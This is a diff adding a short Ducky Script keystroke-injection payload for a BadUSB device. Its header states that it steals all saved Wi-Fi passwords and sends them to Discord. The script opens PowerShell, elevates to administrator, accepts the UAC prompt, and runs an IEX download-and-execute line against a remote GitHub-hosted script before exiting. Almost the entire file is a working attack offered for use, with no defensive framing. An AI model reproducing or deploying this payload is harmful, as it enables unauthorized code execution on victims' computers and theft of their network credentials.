@@ -1,0 +1,25 @@
+REM Author: Drack0z
+REM Description: Steals all of the saved Wifi Passwords and send to discord using.
+REM Version:	1.0
+REM Category:	Passwords
+DELAY 200
+GUI d
+DELAY 300
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 500
+STRING Start-Process powershell -Verb runAs
+ENTER
+LEFTARROW
+ENTER
+DELAY 1200
+ALT y
+DELAY 1200
+GUI UP
+DELAY 1200
+STRING IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Drack0zz/Code/main/wifikey_discord.txt')
+ENTER
+STRING exit
+ENTER
